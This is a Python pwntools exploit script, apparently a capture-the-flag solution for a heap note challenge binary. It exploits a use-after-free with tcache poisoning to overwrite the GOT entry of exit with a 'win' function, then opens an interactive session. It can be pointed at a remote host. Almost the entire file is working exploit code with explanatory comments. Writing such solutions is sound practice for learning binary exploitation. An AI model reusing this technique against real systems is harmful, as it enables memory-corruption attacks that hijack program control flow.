from pwn import args, gdb, remote, process, p64, flat, ROP, ELF, context, log, sys


def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)


def create(data: bytes):
    io.sendlineafter(b"> ", b"1")
    io.sendlineafter(b"data: ", data)


def update(idx: int, data: bytes):
    io.sendlineafter(b"> ", b"3")
    io.sendlineafter(b"): ", str(idx).encode())
    io.sendlineafter(b"data: ", data)


def delete(idx: int):
    io.sendlineafter(b"> ", b"4")
    io.sendlineafter(b"): ", str(idx).encode())


gdbscript = """
init-gef
heap bins
heap chunks
visual-heap
""".format(**locals())

exe = "./heapnotes_patched"
elf = context.binary = ELF(exe, checksec=False)
context.log_level = "info"
# context.terminal = "kitty"

io = start()

create(b"A" * 32)
create(b"B" * 32)

delete(0)
delete(1)
# gdb.attach(io, gdbscript=gdbscript)

# Thers's no safe linking, so we can just make GOT entry point to exit as the fd pointer. Because tcache store the user data section we don't need to think about the padding when unlinking
update(1, p64(elf.got["exit"]))

# gdb.attach(io, gdbscript=gdbscript)

# Got rid of the head chunk (index 1)
create(b"C" * 32)
# The next chunk should be the address of the GOT entry of exit, and now we have write access to it
create(p64(elf.sym["win"]))

# gdb.attach(io, gdbscript=gdbscript)
# Trigger exit()

io.sendlineafter(b"> ", b"5")
io.interactive()
